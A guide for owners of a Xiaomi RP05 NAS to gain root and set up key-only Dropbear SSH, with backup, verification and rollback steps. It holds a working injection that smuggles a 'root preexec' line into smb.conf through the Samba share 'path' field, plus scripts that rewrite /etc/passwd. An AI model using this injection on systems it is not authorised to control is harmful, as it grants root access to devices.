# 小米智能存储 Root 与 SSH：可复现操作指南

本文面向设备所有者或获得明确授权的维护者。变量、路径、地址、证书和密钥都必须替换为你自己的值；本文没有任何真实设备凭据。当前仓库不包含 Root 工具、客户端证书或私钥。

## 已验证范围

源记录来自同一类 RP05 设备的两个固件状态，结果应按下表理解：

| 固件状态 | 已验证入口 | 已验证结果 | 未验证内容 |
| --- | --- | --- | --- |
| `1.0.8`，build `425.F24C26D24-REL` | 小米客户端证书认证的 WebDAV 文件入口，上传并触发经审查的 Root 脚本 | 备份标记、Dropbear socket、独立 Ed25519 公钥登录和 `uid=0` 均通过 | 重启后是否仍可用；固件 SSH 标志写入曾校验失败 |
| `1.0.9`，build `462.F24C26D24-REL` | 小米客户端证书认证的 Samba/netshare 管理接口，触发已有 Samba 特权服务的 `root preexec`，再恢复 SSH | `uid=0`、公钥登录、Dropbear socket 和 root shell 输出均通过 | 其他型号、其他固件、未来升级；RPMB 标志并未被证明可写 |

后一个入口的处理链是：

```text
客户端证书 → /cgi-bin/luci 的 netshare_add_samba_account
  → setuid <service-user> 运行 /usr/bin/smb_mgr.sh
  → uci batch 写入 Samba share
  → smb_mgr.sh 以 echo -e 渲染 smb.conf
  → SMB 客户端连接 share，触发 root preexec
  → 回执写出 id 结果后，再配置 Dropbear 公钥 SSH
```

这不是普通 SSH 登录，也不是插件安装器。初次 Root 必须仍有当前固件接受的客户端证书、管理会话、可写 WebDAV 目录和可用 SMB 账号；只有已经存在 Root 或可信管理入口时，下面的 SSH 恢复步骤才能单独使用。

## 1. 准备变量和工具

在维护电脑上填写变量。证书私钥只从官方客户端的私有证书目录读取，不要复制进仓库：

```sh
NAS_HOST="nas.example.invalid"
NAS_ADDR="nas.example.invalid"         # 改成路由器 DHCP 租约中的地址
HTTPS_PORT="443"
SSH_PORT="22"
CLIENT_CERT="/secure/path/client.crt"
CLIENT_KEY="/secure/path/client.key"
CA_FILE="/secure/path/client-ca.pem"
WEBDAV_ROOT="https://$NAS_HOST/webdav"
LUCI_URL="https://$NAS_HOST/cgi-bin/luci"
SMB_SHARE="root-ssh-probe"
SMB_USER="your-existing-smb-user"
STATE_DIR="${XDG_STATE_HOME:-$HOME/.local/state}/xiaomi-nas-ssh"
umask 077
mkdir -p "$STATE_DIR"
```

检查本机工具和证书文件，不打印证书或私钥内容：

```sh
command -v curl ssh ssh-keygen openssl python3 smbclient
test -r "$CLIENT_CERT" -a -r "$CLIENT_KEY" -a -r "$CA_FILE"
openssl x509 -in "$CLIENT_CERT" -noout -subject -issuer -dates
nc -vz -w 3 "$NAS_ADDR" "$HTTPS_PORT"
```

`NAS_ADDR` 只能来自当前 DHCP 租约或官方客户端。地址变化、SSH 关闭和 Root 入口失效是三种不同情况；不要因 22 端口关闭就重复触发旧脚本。

## 2. 生成专用 SSH 密钥

密钥只用于这台设备，不覆盖默认 `id_ed25519`：

```sh
ssh-keygen -t ed25519 -f "$STATE_DIR/id_ed25519" -C "xiaomi-nas-owner"
chmod 700 "$STATE_DIR"
chmod 600 "$STATE_DIR/id_ed25519"
chmod 644 "$STATE_DIR/id_ed25519.pub"
PUBKEY="$(cat "$STATE_DIR/id_ed25519.pub")"
```

初次 Root 时，电脑上的密钥先作为 enable 脚本的输入；设备备份必须由已经验证为 root 的 enable 脚本在修改登录配置前完成。先在电脑上填写这些变量：

```sh
NAS_STATE="/path/to/persistent/root-access-state"
ROOT_HOME="/path/to/writable/root-home"
BIND_MI_SHELL="1" # 仅当目标固件核对过两个 shell 文件时使用
```

`NAS_STATE` 和 `ROOT_HOME` 只是占位符。已有 root 时，先用 `findmnt`, `df -P` 和 `test -w` 找到持久可写目录；初次 Root 时把它们作为 enable 脚本的参数，脚本会在设备上先创建备份目录。不要在没有 root 的电脑上执行设备备份命令，也不要使用只读的 `/root`。

不要备份或输出 `/etc/shadow`、数据库、Cookie、API key、SMB 密码或私钥。应用数据、容器配置和任务状态需要另做应用一致性备份；enable 脚本的备份只覆盖登录配置。

## 3. 初次 Root：源记录支持的两条路径

### 3.1 证书 + WebDAV 路径（旧固件状态）

源记录中该路径的实际顺序是：

1. 用官方客户端证书校验 CA、客户端证书有效期和 NAS 主机名。
2. 在经证书认证的 WebDAV 目录中上传临时脚本。
3. 使用匹配该固件的社区文件接口触发脚本；脚本先备份 `/etc/passwd`、Dropbear 配置、公钥存在状态和 socket 状态，再写入 root home/shell、公钥和 Dropbear key-only 配置。
4. 以 `22/tcp`、备份完成标记、`id` 返回 root 和第二次独立 SSH 登录作为成功信号。
5. 删除上传脚本；不要把 HTTP `204` 或触发接口的 `404` 单独当作成功或失败。

源记录使用了本地审查过的 `xiaomi-root.py --prepare` 和 `--enable` 适配脚本；它们不在本仓库，且后续固件的旧 WebDAV 触发方式曾失败。因此，这条路径缺少一个可公开复用的当前请求格式：你必须提供自己审查过、与当前固件匹配的脚本和客户端证书。不要从旧笔记猜测 API body、固件安全标志或触发路径。

### 3.2 证书 + Samba/netshare 路径（后续固件状态）

这是源记录中后续固件成功的路径。下面的命令保留了可复用的文件操作、探针、SMB 触发和验证步骤；`netshare_add_samba_account` 的请求字段必须从你自己的官方客户端请求中取得，因为源记录没有提供稳定的跨固件 body 格式。

先创建一个只写回执的探针。`PROBE_DIR` 必须是 WebDAV 与设备本地文件系统对应的同一目录：

```sh
NONCE="$(python3 -c 'import secrets; print(secrets.token_hex(16))')"
PROBE_DIR="/path/to/webdav-visible/probe-$NONCE"
PROBE_SCRIPT="$PROBE_DIR/probe.sh"
RECEIPT_FILE="$PROBE_DIR/receipt-$NONCE.txt"
LOCAL_PROBE="$(mktemp)"
cat > "$LOCAL_PROBE" <<EOF
#!/bin/sh
set -eu
{
  printf 'nonce=%s\n' '$NONCE'
  id
  date -u '+time=%Y-%m-%dT%H:%M:%SZ'
} > '$RECEIPT_FILE'
rm -f "\$0"
EOF
chmod 700 "$LOCAL_PROBE"
```

逐层创建目录并上传探针。WebDAV 端拒绝 `%0A`，因此目录名只使用本地生成的十六进制 nonce：

```sh
curl --fail --silent --show-error --cacert "$CA_FILE" \
  --cert "$CLIENT_CERT" --key "$CLIENT_KEY" \
  -X MKCOL "$WEBDAV_ROOT/probe-$NONCE"
curl --fail --silent --show-error --cacert "$CA_FILE" \
  --cert "$CLIENT_CERT" --key "$CLIENT_KEY" \
  --upload-file "$LOCAL_PROBE" "$WEBDAV_ROOT/probe-$NONCE/probe.sh"
```

源记录观察到的 `path` 处理是：服务端先把 path 放进 `uci -q batch`，再由 `_smb_add_share` 用 `echo -e` 渲染 `smb.conf`。在**已确认相同固件实现**时，待提交给 `path` 字段的值按下式构造：

```sh
PAYLOAD="$(python3 - "$PROBE_DIR" "$PROBE_SCRIPT" <<'PY'
import sys

directory, script = sys.argv[1:]
print(directory + r'\"' + r'\nroot preexec = /bin/sh ' + script + r'\npath = \"' + directory)
PY
)"
case "$PAYLOAD" in
  *"$PROBE_SCRIPT"*) : ;;
  *) echo 'probe payload does not target probe.sh' >&2; exit 1 ;;
esac
printf '%s\n' "$PAYLOAD" > "$STATE_DIR/path.payload"
```

这个字符串只在该固件的 Samba 管理链中有意义；它不是普通 share 路径，也不要提交给没有经过认证的接口。使用官方客户端捕获的同一请求，把 `path` 字段替换为 `PAYLOAD`，再通过客户端证书提交 `netshare_add_samba_account`：

```sh
# REQUEST_TEMPLATE 是官方客户端捕获的完整私有请求；保留其认证字段、cookies、headers 和 share 参数。
# 在 REQUEST_BODY 的私有副本中，只替换 path 字段为 PAYLOAD，保持客户端原始编码。
REQUEST_TEMPLATE="$STATE_DIR/netshare-request-captured.json"
REQUEST_BODY="$STATE_DIR/netshare-request-with-probe-path.json"
cp -p "$REQUEST_TEMPLATE" "$REQUEST_BODY"
test -s "$REQUEST_BODY"
python3 - "$REQUEST_BODY" "$PAYLOAD" <<'PY'
import json
import sys

path, payload = sys.argv[1:]
request = json.load(open(path, encoding='utf-8'))
request['path'] = payload
with open(path, 'w', encoding='utf-8') as stream:
    json.dump(request, stream, ensure_ascii=False, separators=(',', ':'))
PY
curl --fail --silent --show-error --cacert "$CA_FILE" \
  --cert "$CLIENT_CERT" --key "$CLIENT_KEY" \
  -H 'Content-Type: application/json' \
  --data-binary "@$REQUEST_BODY" "$LUCI_URL"
```

如果客户端使用 form 编码而不是 JSON，保持客户端原始的 `Content-Type` 和字段编码；不要猜字段名。源记录已经确认的调用链是 `netshare_add_samba_account → smb_mgr.sh → uci batch → smb.conf → root preexec`，但没有记录可跨固件复用的请求 body。

提交 share 后，用已有 SMB 账号连接一次触发 `root preexec`：

```sh
smbclient "//$NAS_HOST/$SMB_SHARE" -U "$SMB_USER" -c 'ls'
```

用证书认证的 WebDAV GET 读取回执：

```sh
curl --fail --silent --show-error --cacert "$CA_FILE" \
  --cert "$CLIENT_CERT" --key "$CLIENT_KEY" \
  "$WEBDAV_ROOT/probe-$NONCE/receipt-$NONCE.txt"
```

成功信号是回执中 nonce 正确、`id` 显示 root、时间存在；随后才执行下一节的 SSH 配置。若没有回执，不要重复连接或改写原 share，先删除临时 share、探针和管理请求，重新核对固件、客户端证书、WebDAV 本地映射和请求 body。

### 3.3 上传真正的 enable 脚本

探针只证明 `root preexec` 能以 root 执行一个文件；它自删除，**不会创建交互式 shell，也不会配置 SSH**。验证探针后，使用新的 nonce 和回执路径上传第二个文件。下面的 enable 脚本把设备备份放在所有登录修改之前，然后执行 SSH 配置：

```sh
ENABLE_NONCE="$(python3 -c 'import secrets; print(secrets.token_hex(16))')"
ENABLE_DIR="/path/to/webdav-visible/enable-$ENABLE_NONCE"
ENABLE_SCRIPT="$ENABLE_DIR/enable-ssh.sh"
ENABLE_RECEIPT="$ENABLE_DIR/receipt-$ENABLE_NONCE.txt"
LOCAL_ENABLE="$STATE_DIR/enable-ssh.sh"
cat > "$LOCAL_ENABLE" <<'SH'
#!/bin/sh
set -eu
[ "$(id -u)" = 0 ]
NAS_STATE=__NAS_STATE__
ROOT_HOME=__ROOT_HOME__
PUBKEY=__PUBKEY__
RECEIPT_FILE=__RECEIPT_FILE__
NONCE=__NONCE__
BIND_MI_SHELL=__BIND_MI_SHELL__
test -r /etc/default/dropbear

BACKUP_DIR="$NAS_STATE/backup-$(date -u +%Y%m%dT%H%M%SZ)-$NONCE"
install -d -m 700 "$NAS_STATE" "$BACKUP_DIR"
cp -p /etc/passwd "$BACKUP_DIR/passwd.before"
if [ -f /etc/default/dropbear ]; then
  cp -p /etc/default/dropbear "$BACKUP_DIR/dropbear.before"
fi
getent passwd root > "$BACKUP_DIR/root-entry.before"
if [ -f "$ROOT_HOME/.ssh/authorized_keys" ]; then
  cp -p "$ROOT_HOME/.ssh/authorized_keys" "$BACKUP_DIR/authorized_keys.before"
fi
if command -v systemctl >/dev/null 2>&1; then
  systemctl is-enabled dropbear.socket > "$BACKUP_DIR/socket.enabled.before" 2>&1 || :
  systemctl is-active dropbear.socket > "$BACKUP_DIR/socket.active.before" 2>&1 || :
fi
findmnt > "$BACKUP_DIR/mounts.before" 2>/dev/null || :
: > "$BACKUP_DIR/prepared"
sha256sum "$BACKUP_DIR"/* > "$BACKUP_DIR/SHA256SUMS.before" 2>/dev/null || :

install -d -m 755 "$ROOT_HOME"
PASSWD_TMP="/etc/passwd.enable.$$"
awk -F: -v OFS=: -v home="$ROOT_HOME" \
  'BEGIN { found=0 } $1 == "root" { $6=home; $7="/bin/sh"; found=1 } { print } END { if (!found) exit 1 }' \
  /etc/passwd > "$PASSWD_TMP"
chmod 644 "$PASSWD_TMP"
chown root:root "$PASSWD_TMP"
mv "$PASSWD_TMP" /etc/passwd

install -d -m 700 "$ROOT_HOME/.ssh"
KEY_WAS_PRESENT=0
if grep -Fqx -- "$PUBKEY" "$ROOT_HOME/.ssh/authorized_keys" 2>/dev/null; then
  KEY_WAS_PRESENT=1
fi
printf '%s\n' "$KEY_WAS_PRESENT" > "$BACKUP_DIR/key.was-present"
if [ "$KEY_WAS_PRESENT" = 0 ]; then
  printf '%s\n' "$PUBKEY" >> "$ROOT_HOME/.ssh/authorized_keys"
fi
chmod 600 "$ROOT_HOME/.ssh/authorized_keys"
chown -R root:root "$ROOT_HOME/.ssh"

DROPBEAR_CONF="/etc/default/dropbear"
DROPBEAR_TMP="${DROPBEAR_CONF}.enable.$$"
if grep -q '^DROPBEAR_EXTRA_ARGS=' "$DROPBEAR_CONF" 2>/dev/null; then
  sed 's|^DROPBEAR_EXTRA_ARGS=.*|DROPBEAR_EXTRA_ARGS=" -s -g"|' "$DROPBEAR_CONF" > "$DROPBEAR_TMP"
else
  cat "$DROPBEAR_CONF" > "$DROPBEAR_TMP"
  printf '%s\n' 'DROPBEAR_EXTRA_ARGS=" -s -g"' >> "$DROPBEAR_TMP"
fi
chmod 644 "$DROPBEAR_TMP"
chown root:root "$DROPBEAR_TMP"
mv "$DROPBEAR_TMP" "$DROPBEAR_CONF"

systemctl start dropbearkey.service
systemctl start dropbear.socket
chmod 755 "$ROOT_HOME"
if [ "${BIND_MI_SHELL:-0}" = 1 ]; then
  test -x /usr/bin/bash.bash
  test -e /usr/sbin/mi-shell
  mount --bind /usr/bin/bash.bash /usr/sbin/mi-shell
fi
: > "$BACKUP_DIR/applied"
{
  printf 'nonce=%s\n' "$NONCE"
  printf 'backup_dir=%s\n' "$BACKUP_DIR"
  id
  date -u '+time=%Y-%m-%dT%H:%M:%SZ'
  printf '%s\n' ROOT_BACKUP_AND_APPLY_OK
} > "$RECEIPT_FILE"
rm -f "$0"
SH
python3 - "$LOCAL_ENABLE" "$NAS_STATE" "$ROOT_HOME" "$PUBKEY" "$ENABLE_RECEIPT" "$ENABLE_NONCE" "$BIND_MI_SHELL" <<'PY'
import shlex
import sys

path, nas_state, root_home, pubkey, receipt, nonce, bind_mi_shell = sys.argv[1:]
text = open(path, encoding='utf-8').read()
replacements = {
    '__NAS_STATE__': nas_state,
    '__ROOT_HOME__': root_home,
    '__PUBKEY__': pubkey,
    '__RECEIPT_FILE__': receipt,
    '__NONCE__': nonce,
    '__BIND_MI_SHELL__': bind_mi_shell,
}
for token, value in replacements.items():
    text = text.replace(token, shlex.quote(value))
if any(token in text for token in replacements):
    raise SystemExit('unresolved enable-script placeholder')
open(path, 'w', encoding='utf-8').write(text)
PY
chmod 700 "$LOCAL_ENABLE"
```

创建 enable 目录并上传脚本：

```sh
curl --fail --silent --show-error --cacert "$CA_FILE" \
  --cert "$CLIENT_CERT" --key "$CLIENT_KEY" \
  -X MKCOL "$WEBDAV_ROOT/enable-$ENABLE_NONCE"
curl --fail --silent --show-error --cacert "$CA_FILE" \
  --cert "$CLIENT_CERT" --key "$CLIENT_KEY" \
  --upload-file "$LOCAL_ENABLE" "$WEBDAV_ROOT/enable-$ENABLE_NONCE/enable-ssh.sh"
```

把同一个经过验证的临时 share 请求改为指向 enable 脚本，而不是回执文件：

```sh
ENABLE_PAYLOAD="$(python3 - "$ENABLE_DIR" "$ENABLE_SCRIPT" <<'PY'
import sys

directory, script = sys.argv[1:]
print(directory + r'\"' + r'\nroot preexec = /bin/sh ' + script + r'\npath = \"' + directory)
PY
)"
case "$ENABLE_PAYLOAD" in
  *"$ENABLE_SCRIPT"*) : ;;
  *) echo 'enable payload does not target enable-ssh.sh' >&2; exit 1 ;;
esac
ENABLE_REQUEST="$STATE_DIR/netshare-request-with-enable-path.json"
cp -p "$REQUEST_TEMPLATE" "$ENABLE_REQUEST"
python3 - "$ENABLE_REQUEST" "$ENABLE_PAYLOAD" <<'PY'
import json
import sys

path, payload = sys.argv[1:]
request = json.load(open(path, encoding='utf-8'))
request['path'] = payload
with open(path, 'w', encoding='utf-8') as stream:
    json.dump(request, stream, ensure_ascii=False, separators=(',', ':'))
PY
curl --fail --silent --show-error --cacert "$CA_FILE" \
  --cert "$CLIENT_CERT" --key "$CLIENT_KEY" \
  -H 'Content-Type: application/json' \
  --data-binary "@$ENABLE_REQUEST" "$LUCI_URL"
smbclient "//$NAS_HOST/$SMB_SHARE" -U "$SMB_USER" -c 'ls'
```

The local substitution step embeds the owner values only in the private upload copy; the public guide keeps placeholders. Preserve the official client’s authenticated fields in `REQUEST_TEMPLATE`; only its `path` value is replaced. Read the fresh receipt and check all markers before opening SSH:

```sh
curl --fail --silent --show-error --cacert "$CA_FILE" \
  --cert "$CLIENT_CERT" --key "$CLIENT_KEY" \
  "$WEBDAV_ROOT/enable-$ENABLE_NONCE/receipt-$ENABLE_NONCE.txt"
```

Expected output contains the new nonce, `backup_dir=...`, `uid=0` from `id`, `time=...`, and `ROOT_BACKUP_AND_APPLY_OK`. Keep that `backup_dir` value and set it as `BACKUP_DIR` before using the manual rollback block. The enable script performs the device backup before changing `/etc/passwd`, `authorized_keys`, or Dropbear; it does not rely on the receipt-only probe to create SSH.

## 4. 配置 key-only SSH（enable 脚本已包含）

3.3 的 `enable-ssh.sh` 已经按以下顺序完成设备备份、root 条目、公钥和 Dropbear 配置；初次 Root 用户不要在同一次恢复中重复执行。下面的块用于已有 root 用户手动恢复，或审计上传脚本实际做了什么；手动执行前仍要先做同样的备份。

### 4.1 只修改 root 条目

源设备的 `/root` 位于只读 EROFS，故把 root home 改到持久可写目录；只改 root 这一行，不要用旧备份覆盖整份 passwd：

```sh
install -d -m 755 "$ROOT_HOME"
python3 - "$BACKUP_DIR/passwd.before" /etc/passwd "$ROOT_HOME" <<'PY'
import os
import sys
import tempfile

backup, target, home = sys.argv[1:]
lines = open(target, encoding='utf-8').read().splitlines(keepends=True)
found = False
out = []
for line in lines:
    fields = line.rstrip('\n').split(':')
    if fields and fields[0] == 'root':
        fields[5] = home
        fields[6] = '/bin/sh'
        line = ':'.join(fields) + ('\n' if line.endswith('\n') else '')
        found = True
    out.append(line)
if not found:
    raise SystemExit('root entry not found')
fd, tmp = tempfile.mkstemp(prefix='.passwd.', dir=os.path.dirname(target), text=True)
os.fchmod(fd, os.stat(target).st_mode & 0o777)
with os.fdopen(fd, 'w', encoding='utf-8') as stream:
    stream.writelines(out)
os.replace(tmp, target)
PY
```

### 4.2 安装公钥和 Dropbear 配置

```sh
install -d -m 700 "$ROOT_HOME/.ssh"
KEY_WAS_PRESENT=0
if grep -Fqx -- "$PUBKEY" "$ROOT_HOME/.ssh/authorized_keys" 2>/dev/null; then
  KEY_WAS_PRESENT=1
else
  printf '%s\n' "$PUBKEY" >> "$ROOT_HOME/.ssh/authorized_keys"
fi
printf '%s\n' "$KEY_WAS_PRESENT" > "$BACKUP_DIR/key.was-present"
chmod 600 "$ROOT_HOME/.ssh/authorized_keys"

DROPBEAR_CONF="/etc/default/dropbear"
cp -p "$DROPBEAR_CONF" "$BACKUP_DIR/dropbear.before.apply"
python3 - "$DROPBEAR_CONF" <<'PY'
import re
import sys

path = sys.argv[1]
text = open(path, encoding='utf-8').read()
line = 'DROPBEAR_EXTRA_ARGS=" -s -g"'
if re.search(r'(?m)^DROPBEAR_EXTRA_ARGS=.*$', text):
    text = re.sub(r'(?m)^DROPBEAR_EXTRA_ARGS=.*$', line, text, count=1)
else:
    text = text.rstrip('\n') + '\n' + line + '\n'
open(path, 'w', encoding='utf-8').write(text)
PY
```

源记录在该固件上使用 `-s -g` 后以公钥登录；`-s` 的 key-only 意义必须用目标设备的 `dropbear -h` 核对，其他 Dropbear 构建不要盲目复制 `-g`。若你的版本文档明确使用其他禁用密码的参数，保留其原生写法，成功标准仍是密码认证被拒绝、公钥认证成功。

### 4.3 启动 socket 并处理 root shell 包装器（脚本已执行）

源设备必须通过 socket unit 启动，直接运行常驻 dropbear 会被 Samba cgroup 回收。enable 脚本已执行这些动作；以下命令用于核对状态，已有 root 手动恢复时才按需执行：

```sh
systemctl start dropbearkey.service
systemctl start dropbear.socket
chmod 755 "$ROOT_HOME"
systemctl is-active dropbear.socket
systemctl is-enabled dropbear.socket
ss -lnt | grep ':22[[:space:]]' || ss -lnt | grep ':22$'
```

如果 SSH 能认证但没有 shell 输出，源设备还观察到厂商 Dropbear 强制执行 `/usr/sbin/mi-shell`。仅在下面两个文件都与当前固件核对一致时应用临时 bind mount：

```sh
test -x /usr/bin/bash.bash
test -e /usr/sbin/mi-shell
mount --bind /usr/bin/bash.bash /usr/sbin/mi-shell
findmnt /usr/sbin/mi-shell
```

该挂载不跨重启持久化，回退时用 `umount /usr/sbin/mi-shell`，并以 `findmnt` 确认它确实是本次创建的挂载。

## 5. 从维护电脑验证

先把主机指纹通过原生管理页或已有控制台核对，再使用独立 known_hosts：

```sh
KNOWN_HOSTS="$STATE_DIR/known_hosts"
touch "$KNOWN_HOSTS"
chmod 600 "$KNOWN_HOSTS"

ssh -i "$STATE_DIR/id_ed25519" \
  -o IdentitiesOnly=yes \
  -o StrictHostKeyChecking=ask \
  -o UserKnownHostsFile="$KNOWN_HOSTS" \
  -o PasswordAuthentication=no \
  -o KbdInteractiveAuthentication=no \
  -o ForwardAgent=no -o ForwardX11=no \
  -p "$SSH_PORT" "root@$NAS_HOST" \
  'test "$(id -u)" = 0 && id && getent passwd root && command -v sh && systemctl is-active dropbear.socket'
```

通过标准是：连接只接受这把公钥、`id -u` 为 0、root home 是预期可写目录、shell 有输出、socket active。换电脑时新增公钥并保留旧回退点；不要复制私钥或关闭主机密钥校验。

SSH 验证成功后再删除临时文件；share 用官方客户端的删除操作或同一请求格式删除，避免手写未知字段：

```sh
curl --fail --silent --show-error --cacert "$CA_FILE" \
  --cert "$CLIENT_CERT" --key "$CLIENT_KEY" \
  -X DELETE "$WEBDAV_ROOT/probe-$NONCE/probe.sh" || :
curl --fail --silent --show-error --cacert "$CA_FILE" \
  --cert "$CLIENT_CERT" --key "$CLIENT_KEY" \
  -X DELETE "$WEBDAV_ROOT/probe-$NONCE/receipt-$NONCE.txt" || :
curl --fail --silent --show-error --cacert "$CA_FILE" \
  --cert "$CLIENT_CERT" --key "$CLIENT_KEY" \
  -X DELETE "$WEBDAV_ROOT/enable-$ENABLE_NONCE/enable-ssh.sh" || :
curl --fail --silent --show-error --cacert "$CA_FILE" \
  --cert "$CLIENT_CERT" --key "$CLIENT_KEY" \
  -X DELETE "$WEBDAV_ROOT/enable-$ENABLE_NONCE/receipt-$ENABLE_NONCE.txt" || :
```

## 6. 可选的“已有公钥 SSH”开机恢复 helper

固件的 `boot_check` 曾在 RPMB SSH 标志不是 true 时停止 `dropbear.socket`。如果你已经完成一次 root 配置，并且只想在开机后恢复**已有**公钥，可以使用下面的 helper。它不获取初次 Root、不改密码策略、不写 RPMB，只在 root home、公钥和 socket 条件仍符合预期时启动现有 unit：

```sh
cat > "$NAS_STATE/restore-existing-key-ssh.sh" <<'SH'
#!/bin/sh
set -eu
[ "$(id -u)" = 0 ]
: "${ROOT_HOME:?set ROOT_HOME to the already verified root home}"
: "${EXPECTED_KEY:?set EXPECTED_KEY to the already authorized public key}"
test -d "$ROOT_HOME"
test "$(stat -c '%a' "$ROOT_HOME" 2>/dev/null || stat -f '%Lp' "$ROOT_HOME")" = 755
test "$(getent passwd root | awk -F: '{print $6}')" = "$ROOT_HOME"
test "$(getent passwd root | awk -F: '{print $7}')" = /bin/sh
test -f "$ROOT_HOME/.ssh/authorized_keys"
grep -Fqx -- "$EXPECTED_KEY" "$ROOT_HOME/.ssh/authorized_keys"
test "$(stat -c '%a' "$ROOT_HOME/.ssh/authorized_keys" 2>/dev/null || stat -f '%Lp' "$ROOT_HOME/.ssh/authorized_keys")" = 600
systemctl start dropbearkey.service
systemctl start dropbear.socket
test "$(systemctl is-active dropbear.socket)" = active
SH
chmod 700 "$NAS_STATE/restore-existing-key-ssh.sh"
```

这个 helper **不会**自动恢复 `/usr/sbin/mi-shell` 的 bind mount；源设备在没有该挂载时可能公钥认证成功但没有 shell 输出。只有确认本机就是同一厂商 shell 行为时，才在 helper 的 `systemctl start` 前加入下面三行，并把卸载动作加入回退：

```sh
if [ "${RESTORE_MI_SHELL_BIND:-0}" = 1 ]; then
  test -x /usr/bin/bash.bash
  test -e /usr/sbin/mi-shell
  mountpoint -q /usr/sbin/mi-shell || mount --bind /usr/bin/bash.bash /usr/sbin/mi-shell
fi
```

先在已验证的 root shell 中以环境变量运行一次：

```sh
ROOT_HOME="$ROOT_HOME" EXPECTED_KEY="$PUBKEY" \
  "$NAS_STATE/restore-existing-key-ssh.sh"
```

只有在确认设备的 `/etc` overlay 会在开机阶段可见后，才把它接到 vendor boot-check 的 `ExecStartPost` 或原生 Cron 的一次性 boot-ID 协调器；先保存现有 unit/drop-in，并用 `systemd-analyze verify` 检查。若开机后脚本看不到 `/etc` 或 `ROOT_HOME`，删除该自动化尝试并回到手动 SSH 恢复，不要修改原厂 boot-check 脚本。

## 7. 精确回退

保持当前 root 会话，并从第二个终端确认新公钥登录成功后，按相反顺序撤销：

```sh
# 1. 若本次创建了临时 shell 挂载，先确认并卸载它。
findmnt /usr/sbin/mi-shell
umount /usr/sbin/mi-shell

# 2. 只从 authorized_keys 删除本次新增的一行；原来已有的 key 保留。
if ! grep -q '^1$' "$BACKUP_DIR/key.was-present" 2>/dev/null; then
  TMP_KEYS="$(mktemp)"
  grep -Fvx -- "$PUBKEY" "$ROOT_HOME/.ssh/authorized_keys" > "$TMP_KEYS" || :
  install -m 600 "$TMP_KEYS" "$ROOT_HOME/.ssh/authorized_keys"
  rm -f "$TMP_KEYS"
fi

# 3. 恢复 Dropbear 配置和 root 条目；不要覆盖之后新增的账号。
cp -p "$BACKUP_DIR/dropbear.before" /etc/default/dropbear
python3 - "$BACKUP_DIR/passwd.before" /etc/passwd <<'PY'
import os
import sys
import tempfile

backup, target = sys.argv[1:]
old = {line.split(':', 1)[0]: line for line in open(backup, encoding='utf-8')}
lines = open(target, encoding='utf-8').read().splitlines(keepends=True)
out = []
for line in lines:
    name = line.split(':', 1)[0]
    out.append(old.get(name, line) if name == 'root' else line)
fd, tmp = tempfile.mkstemp(prefix='.passwd.', dir=os.path.dirname(target), text=True)
os.fchmod(fd, os.stat(target).st_mode & 0o777)
with os.fdopen(fd, 'w', encoding='utf-8') as stream:
    stream.writelines(out)
os.replace(tmp, target)
PY

# 4. Restore the socket's previous enabled state, then stop it last.
if grep -q '^enabled$' "$BACKUP_DIR/socket.enabled.before" 2>/dev/null; then
  systemctl enable dropbear.socket
else
  systemctl disable dropbear.socket
fi
systemctl stop dropbear.socket
```

If `authorized_keys.before` exists, compare it before removing the temporary key. Do not recursively delete `.ssh`, root home, the WebDAV directory, or the original Samba share. Remove the temporary share and probe through the same authenticated netshare path, then delete the probe file and verify with the backup SHA-256 list.

Rollback restores the recorded login configuration; it does not prove that RPMB state, firmware upgrade behavior, vendor service records or a factory image are unchanged. A firmware upgrade may require a new, firmware-specific initial entry. An existing-key helper cannot obtain Root after the privileged entry itself has disappeared.

## 8. Daily checks and plugin deployment

After a reboot or firmware upgrade, discover the current lease again and run only read-only checks first:

```sh
nc -vz -w 3 "$NAS_ADDR" "$SSH_PORT"
ssh -i "$STATE_DIR/id_ed25519" -o IdentitiesOnly=yes \
  -o UserKnownHostsFile="$KNOWN_HOSTS" -o StrictHostKeyChecking=yes \
  -p "$SSH_PORT" "root@$NAS_HOST" \
  'id -u; systemctl is-active dropbear.socket; getent passwd root'
```

If the key is still authorized and only the socket was stopped, use the existing-key helper. If the root entry, writable home, or privileged management route is gone, the missing input is a new client-authenticated, firmware-matched initial entry; do not treat a source upload, fixed IP or plugin CGI as Root.

Once SSH or the native authenticated CGI host is verified, continue with [安装与回退](INSTALL.md). The plugin package still needs the native session gate and configured owner/UID checks; Root/SSH recovery does not install or register these plugins.
